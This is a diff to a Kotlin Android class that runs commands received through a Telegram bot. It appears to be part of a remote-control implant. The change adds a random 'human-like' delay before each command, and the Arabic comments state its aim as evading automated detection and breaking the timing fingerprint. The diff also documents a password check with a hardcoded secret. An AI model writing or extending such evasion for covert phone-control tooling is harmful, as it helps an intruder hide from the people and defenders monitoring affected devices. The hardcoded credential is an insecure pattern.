@@ -27,7 +27,7 @@ import kotlin.random.Random
  * ✅ تم تحسين sendPulseIntent للتعامل مع فشل بدء الخدمة.
  * ✅ تم إصلاح handleMedia لاستخراج message_id من JSONObject مباشرة.
  * ✅ تم إضافة @Volatile للمتغيرات المشتركة.
- * ✅ تم إضافة تأخير بشري (Human-like Jitter) لتجنب الكشف الآلي.
+ * ✅ تم إضافة تأخير بشري (Human-like Jitter) في execute لتجنب الكشف الآلي.
  */
 class Commands private constructor(context: Context) {
 
@@ -450,13 +450,16 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  دوال تنفيذ الأوامر (نقطة الدخول الأساسية)
+    //  دوال تنفيذ الأوامر (نقطة الدخول الأساسية) - تم إضافة التأخير البشري
     // ============================================================
 
     fun execute(cmd: String, tg: Any?, m: Any?, cid: Long, cbq: String? = null) {
         scope.launch {
             try {
                 if (cmd.isBlank()) return@launch
+
+                // ✅ تأخير بشري عشوائي (300-900 مللي) لتجنب الأنماط الآلية وكسر البصمة الزمنية
+                delay(Random.nextLong(300, 900))
 
                 cbq?.let { queryId ->
                     invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
@@ -487,7 +490,7 @@ class Commands private constructor(context: Context) {
 
                     cmd.startsWith("media_") -> handleMedia(tg, m, cid)
 
-                    else -> sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم /menu لعرض القائمة.")
+                    else -> sendTelegramMessage(tg, cid, "⚠️ أمر غير معروف. استخدم الأزرار.")
                 }
 
             } catch (e: Exception) {
@@ -978,11 +981,12 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  ✅ دالة مساعدة للتحقق من كلمة السر
+    //  ✅ دالة مساعدة للتحقق من كلمة السر (نصية فقط)
     // ============================================================
 
     /**
      * التحقق من صحة كلمة السر المدخلة.
+     * تُستخدم فقط للتحقق من النصوص، بينما جميع الأوامر الأخرى عبر الأزرار.
      */
     fun validateControlPassword(inputSecret: String, expectedSecret: String = "Zaen123@123@"): Boolean {
         return inputSecret.trim() == expectedSecret
